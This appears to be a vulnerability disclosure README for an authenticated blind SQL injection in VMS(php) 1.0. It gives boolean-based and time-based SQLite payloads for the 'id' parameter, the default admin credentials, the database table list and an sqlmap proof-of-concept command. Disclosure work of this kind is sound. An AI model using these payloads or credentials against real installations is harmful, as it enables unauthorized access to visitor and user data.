<div align="center">
    <h1>VMS(php) Visitor Management System</h1>
    <h3>💉 Authenticated Blind SQL Injection (View Visitor) 💉</h3>
    <br />
    <!-- Vendor -->
    <a href="https://www.sourcecodester.com/">
        <img src="https://img.shields.io/badge/vendor-sourcecodester.com-8DD6F9?style=for-the-badge&logo=webpack" alt="Vendor: sourcecodester.com" title="Vendor: sourcecodester.com" />
    </a>
    <!-- Version & Download -->
    <a href="https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-sqlite-vms.zip">
        <img src="https://img.shields.io/badge/version-1.0-F16728?style=for-the-badge&logo=vitess" alt="Version: 1.0" title="Version: 1.0" />
    </a>
    <!-- Vulnerability -->
    <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">
        <img src="https://img.shields.io/badge/vulnerability-Blind%20SQL%20Injection-EAEAEA?style=for-the-badge&logo=owasp" alt="Blind SQL Injection" title="Blind SQL Injection" />
    </a>
    <!-- Exploit -->
    <a href="#">
        <img src="https://img.shields.io/badge/exploit-Not found-494649?style=for-the-badge&logo=hackaday" alt="Blind SQL Injection" title="Blind SQL Injection" />
    </a>
    <br />
</div>

---

## 📝 Description

VMS(php) 1.0 allows Authenticated Blind SQL Injection (Time-based & Boolean-based) via the GET parameter `id` in the `/?page=view_visitor` endpoint.

This endpoint can be triggered through the following menu: Visitor List > Action > View visitor.

## ℹ️ Information

**Entrypoint**: http://localhost/php-sqlite-vms/

**Default credentials**:

| Username | Password |
| --- | --- |
| admin | sourcecodester&123 |

## 💉 Injection Point

```sql
Parameter: id (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: /?page=view_visitor&id=4' AND 2488=2488 AND 'cutA'='cutA

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: /?page=view_visitor&id=4' AND 5085=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'UtVl'='UtVl
```

## 📋 Database Schema

```
[3 tables]
+-----------------+
| sqlite_sequence |
| user_list       |
| visitor_list    |
+-----------------+
```

## 🕹️ Proof of Concept

```sh
sqlmap --url 'http://localhost/php-sqlite-vms/?page=view_visitor&id=1' -p 'id' --dbms 'sqlite' --technique 'BT' --cookie 'PHPSESSID=9447ea9b...'
```